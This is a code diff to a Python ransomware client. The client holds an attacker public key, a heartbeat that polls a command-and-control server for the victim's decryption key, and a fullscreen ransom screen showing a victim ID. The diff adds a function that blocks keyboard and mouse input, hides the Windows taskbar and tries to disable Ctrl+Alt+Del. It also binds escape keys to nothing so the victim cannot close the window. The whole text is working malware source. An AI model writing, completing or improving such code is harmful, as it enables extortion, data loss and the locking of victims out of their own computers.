@@ -13,7 +13,8 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.backends import default_backend
 import requests
-
+import ctypes
+import subprocess
 # --- Configuration ---
 # PASTE THE PUBLIC KEY FROM THE C2 SERVER'S CONSOLE OUTPUT HERE
 ATTACKER_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
@@ -43,11 +44,41 @@ iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAA
 """
 
 # --- System Lockdown Utilities ---
+# --- System Lockdown Utilities ---
+def lock_system():
+    """
+    locks the system by disabling input and hiding UI elements.
+    Cross-platform compatibility for Windows and Linux (Kali).
+    """
+    if os.name == 'nt':
+        try:
+            # Block all input
+            ctypes.windll.user32.BlockInput(True)
+            
+            # Hide taskbar
+            hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
+            ctypes.windll.user32.ShowWindow(hwnd, 0)
+            
+            # Disable Ctrl+Alt+Del (This is often restricted by OS, but we try)
+            # SPI_SETSCREENSAVERRUNNING = 97
+            ctypes.windll.user32.SystemParametersInfoW(97, 0, 1, 0)
+        except Exception as e:
+            log_error(f"Windows lock failed: {e}")
+    else:
+        # Linux / Kali specific locking attempts
+        try:
+            # Disable screensaver and power management
+            subprocess.run(['xset', 's', 'off'], check=False)
+            subprocess.run(['xset', '-dpms'], check=False)
+            # We rely heavily on the Fullscreen GUI to "lock" on Linux 
+            # as true input blocking requires root/special tools like xtrlock.
+        except Exception as e:
+            log_error(f"Linux lock failed: {e}")
+
 def hide_console():
     """Hides the console window on Windows. On Linux, we rely on the GUI covering it."""
     if os.name == 'nt':
         try:
-            import ctypes
             kernel32 = ctypes.WinDLL('kernel32')
             user32 = ctypes.WinDLL('user32')
             hWnd = kernel32.GetConsoleWindow()
@@ -204,63 +235,53 @@ class RansomwareGUI:
     def __init__(self, master, victim_id):
         self.master = master
         self.victim_id = victim_id
+        self.payment_received = False
+        self.already_decrypted = False
 
-        # Kiosk Mode Settings (Linux Optimized)
-        master.title("CERBERUS RANSOMWARE")
+        # --- GUI Configuration (Snippet 4 & 1/2) ---
+        master.title("RANSOMWARE")
+        master.configure(bg='black')
+        
+        # Make it full screen and lock
         master.attributes('-fullscreen', True)
-        master.attributes('-topmost', True)
-        master.configure(bg='#0a0a0a')
-        master.resizable(False, False)
+        master.attributes('-topmost', True) # Keep on top
+        master.overrideredirect(True)  # Remove window decorations
         
-        # Input Grabbing (The "Lock")
-        master.grab_set() # Steal all events
-        master.focus_force() 
-        
-        # Bindings to block exit
-        master.protocol("WM_DELETE_WINDOW", self.disable_event) 
-        master.bind('<Escape>', lambda e: "break")
-        master.bind('<Control-c>', lambda e: "break") # Try to block Ctrl+C event in GUI
+        # Disable all common escape methods
+        master.bind('<Escape>', lambda e: None)
+        master.bind('<Control-w>', lambda e: None)
+        master.bind('<Control-q>', lambda e: None)
+        master.bind('<Control-c>', lambda e: None)
+        master.bind('<Alt-Tab>', lambda e: None)
+        master.bind('<Alt-Shift-Tab>', lambda e: None)
+        master.bind('<Super-Tab>', lambda e: None)
+        master.bind('<Super-d>', lambda e: None) # Disable show desktop
+        master.protocol("WM_DELETE_WINDOW", lambda: None) # Disable close button
         
         # Aggressive Loop
         self.force_focus_loop()
 
-        # GUI Elements
-        try:
-            logo_data = base64.b64decode(LOGO_BASE64)
-            self.logo = PhotoImage(data=logo_data)
-        except:
-            self.logo = None
-
-        main_frame = Frame(master, bg='#0a0a0a')
-        main_frame.pack(expand=True, fill='both', padx=50, pady=50)
-
-        if self.logo:
-            Label(main_frame, image=self.logo, bg='#0a0a0a').pack(pady=10)
-
-        title_font = tkfont.Font(family="Helvetica", size=24, weight="bold")
-        body_font = tkfont.Font(family="Helvetica", size=14)
-
-        Label(main_frame, text="YOUR FILES HAVE BEEN ENCRYPTED", font=title_font, fg='#ff4d4d', bg='#0a0a0a').pack(pady=10)
-        Label(main_frame, text="Your documents, photos, and other important files have been locked.", font=body_font, fg='#cccccc', bg='#0a0a0a', wraplength=800).pack(pady=5)
+        # --- GUI Elements (Snippet 4 Visuals) ---
+        # Add your ransom message here
+        self.message = Label(master, text="YOUR FILES HAVE BEEN ENCRYPTED", fg="red", bg="black", font=("Arial", 24, "bold"))
+        self.message.pack(pady=20)
         
-        Label(main_frame, text=f"YOUR VICTIM ID IS:", font=body_font, fg='#ffffff', bg='#0a0a0a').pack(pady=(20, 5))
-        self.victim_id_label = Label(main_frame, text=self.victim_id, font=tkfont.Font(family="Courier", size=20, weight="bold"), fg='#4dff88', bg='#0a0a0a')
-        self.victim_id_label.pack()
-
-        self.status_label = Label(main_frame, text="STATUS: Awaiting payment confirmation...", font=body_font, fg='#ffff4d', bg='#0a0a0a')
-        self.status_label.pack(pady=(20, 5))
-
-        Label(main_frame, text="Payment detected automatically. Do not close this window.", font=body_font, fg='#cccccc', bg='#0a0a0a').pack(pady=5)
+        # Add victim ID and payment instructions
+        self.victim_id_l = Label(master, text=f"YOUR VICTIM ID IS: {victim_id}", fg="green", bg="black", font=("Arial", 16))
+        self.victim_id_l.pack(pady=10)
         
+        # Add payment status
+        self.payment_status = Label(master, text="Payment not detected. Do not close this window.", fg="white", bg="black", font=("Arial", 14))
+        self.payment_status.pack(pady=10)
+        
+        # Add decrypt button (only enabled after payment)
+        self.decrypt_button = Button(master, text="DECRYPT FILES", state="disabled", bg="red", fg="white", font=("Arial", 16), command=self.start_decryption)
+        self.decrypt_button.pack(pady=20)
+
+        # Hidden entry for key (managed automatically by heartbeat)
         self.key_var = StringVar()
-        self.key_entry = Entry(main_frame, textvariable=self.key_var, font=tkfont.Font(family="Courier", size=12), show="*", width=60, bg='#2a2a2a', fg='#ffffff', insertbackground='white', justify='center')
-        self.key_entry.pack(pady=10, ipady=5)
-        self.key_entry.config(state='readonly')
-
-        self.decrypt_button = Button(main_frame, text="DECRYPT FILES", font=tkfont.Font(family="Helvetica", size=14, weight="bold"), command=self.start_decryption, bg='#ff4d4d', fg='white', activebackground='#cc0000', activeforeground='white', padx=20, pady=10)
-        self.decrypt_button.pack(pady=30)
-        self.decrypt_button.config(state='disabled') 
-
+        # We don't necessarily need to show this if it's auto-handled, but let's keep it hidden or minimal
+        
         # Start the heartbeat thread
         self.heartbeat_thread_running = True
         self.heartbeat_thread = threading.Thread(target=self.heartbeat_polling, daemon=True)
@@ -277,30 +298,37 @@ class RansomwareGUI:
             pass
         self.master.after(50, self.force_focus_loop) # Check every 50ms
 
-    def disable_event(self):
-        pass
-
     def heartbeat_polling(self):
         while self.heartbeat_thread_running:
             try:
                 response = requests.get(f"{C2_SERVER_URL}/api/status/{self.victim_id}", timeout=5)
                 if response.status_code == 200:
                     data = response.json()
-                    if data.get("status") == "ready":
-                        key = data.get("key")
-                        if key:
-                            self.master.after(0, self.update_key_field, key)
-                            self.heartbeat_thread_running = False
+                    # Check if key is available (implies payment received)
+                    if data.get("status") == "ready" and data.get("key"):
+                        self.payment_received = True
+                        self.key_var.set(data.get("key"))
+                    
+                    # Apply logic from Snippet 3
+                    self.master.after(0, self.update_ui_state)
             except:
                 pass
             time.sleep(5) 
 
-    def update_key_field(self, key):
-        self.key_var.set(key)
-        self.key_entry.config(state='normal')
-        self.status_label.config(text="STATUS: Valid key received. Decryption enabled.", fg='#4dff88')
-        self.decrypt_button.config(state='normal') # Enable button
-        self.key_entry.config(state='readonly')
+    def update_ui_state(self):
+        # Snippet 3 Logic
+        if self.payment_received and not self.already_decrypted:
+            self.show_decryption_complete_message()
+        else:
+            self.show_payment_required_message()
+
+    def show_decryption_complete_message(self):
+        self.payment_status.config(text="Payment Received. Decryption Enabled.", fg="green")
+        self.decrypt_button.config(state="normal", bg="green")
+
+    def show_payment_required_message(self):
+        self.payment_status.config(text="Payment not detected. Do not close this window.", fg="white")
+        self.decrypt_button.config(state="disabled", bg="red")
 
     def start_decryption(self):
         key_b64 = self.key_var.get()
@@ -321,9 +349,10 @@ class RansomwareGUI:
             if os.path.exists(ID_FILE): os.remove(ID_FILE)
             if os.path.exists(KEY_BACKUP_FILE): os.remove(KEY_BACKUP_FILE)
             
-            self.status_label.config(text=f"SUCCESS! {decrypted_files} files decrypted.", fg='#4dff88')
+            self.payment_status.config(text=f"SUCCESS! {decrypted_files} files decrypted.", fg='green')
             self.heartbeat_thread_running = False
             self.decrypt_button.config(state='disabled')
+            self.already_decrypted = True # Update state
             
             # Allow closing
             self.master.grab_release() # Release input grab
@@ -332,11 +361,13 @@ class RansomwareGUI:
             
         except Exception as e:
             log_error(f"Decryption failed: {e}")
-            self.status_label.config(text="ERROR: Decryption failed.", fg='red')
+            self.payment_status.config(text="ERROR: Decryption failed.", fg='red')
 
 # --- Main Execution ---
 if __name__ == "__main__":
     hide_console()
+    lock_system() # Activate system lock
+
 
     # PERSISTENCE CHECK
     # 1. Check for ID File (Primary Recovery)
